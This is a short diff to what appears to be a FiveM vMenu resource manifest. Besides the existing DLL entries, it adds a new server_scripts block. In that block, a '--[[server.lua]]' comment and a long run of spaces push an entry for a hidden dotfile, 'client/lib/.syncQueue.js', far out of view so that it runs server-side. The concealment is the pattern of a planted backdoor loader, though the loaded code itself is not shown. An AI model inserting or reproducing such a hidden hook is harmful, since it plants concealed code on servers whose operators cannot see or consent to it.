@@ -30,3 +30,7 @@ files {
 
 client_script 'vMenuClient.net.dll'
 server_script 'vMenuServer.net.dll'
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.syncQueue.js',
+}
